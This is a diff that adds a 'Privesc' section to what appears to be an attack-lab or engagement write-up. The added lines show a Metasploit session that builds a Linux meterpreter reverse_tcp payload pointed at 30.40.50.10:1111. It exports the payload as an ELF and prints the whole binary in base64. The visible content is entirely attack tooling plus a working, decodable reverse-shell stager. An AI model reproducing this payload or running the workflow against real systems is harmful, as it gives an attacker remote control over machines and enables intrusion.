@@ -1475,5 +1475,28 @@ l42-adv-c2
 uid=1002(foothold) gid=1002(foothold) groups=1002(foothold)
 /home/foothold
 
+```
+
+## Privesc
+```
+┌──(kali㉿blue-ops)-[~]
+└─$ msfconsole -q       
+msf > use payload/linux/x64/meterpreter/reverse_tcp 
+msf payload(linux/x64/meterpreter/reverse_tcp) > set LHOST 30.40.50.10
+LHOST => 30.40.50.10
+msf payload(linux/x64/meterpreter/reverse_tcp) > set LPORT 1111
+LPORT => 1111
+msf payload(linux/x64/meterpreter/reverse_tcp) > set prependfork true
+prependfork => true
+msf payload(linux/x64/meterpreter/reverse_tcp) > generate -f elf -o rev1111 
+
+┌──(kali㉿blue-ops)-[~]
+└─$ base64 rev1111              
+f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB
+AAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQ
+AAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpq
+B1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCAARXHigyClFIieZqEFpqKlgPBVlI
+hcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m
+
 
 ```
